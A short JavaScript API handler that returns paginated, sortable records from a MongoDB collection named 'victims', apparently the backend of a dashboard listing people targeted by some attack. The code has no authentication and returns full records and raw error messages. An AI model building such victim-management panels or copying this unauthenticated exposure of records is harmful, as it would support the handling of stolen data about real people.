/**
 * Victims API Endpoint
 *
 * Provides paginated list of victims
 *
 * GET /api/victims?page=1&limit=20&sort=-timestamp
 */

import { getVictimsCollection } from './_mongodb.js';

/**
 * Parse sort parameter
 * @param {string} sortParam
 * @returns {Object}
 */
function parseSortParam(sortParam) {
  if (!sortParam) return { timestamp: -1 };

  const direction = sortParam.startsWith('-') ? -1 : 1;
  const field = sortParam.replace(/^-/, '');

  return { [field]: direction };
}

/**
 * Main handler
 */
export default async function handler(req, res) {
  // Only allow GET
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const collection = await getVictimsCollection();

    // Parse query parameters
    const page = parseInt(req.query.page) || 1;
    const limit = Math.min(parseInt(req.query.limit) || 20, 100); // Max 100 per page
    const sort = parseSortParam(req.query.sort);
    const skip = (page - 1) * limit;

    // Get total count
    const totalRecords = await collection.countDocuments();

    // Fetch victims with pagination
    const victims = await collection
      .find({})
      .sort(sort)
      .skip(skip)
      .limit(limit)
      .toArray();

    // Return full victim objects (keep original structure for frontend)
    // The frontend VictimTable expects the full nested structure
    const formattedVictims = victims;

    // Calculate pagination info
    const totalPages = Math.ceil(totalRecords / limit);

    return res.status(200).json({
      victims: formattedVictims,
      pagination: {
        currentPage: page,
        totalPages,
        totalRecords,
        hasNext: page < totalPages,
        hasPrev: page > 1,
        perPage: limit,
      },
    });
  } catch (error) {
    console.error('Victims error:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
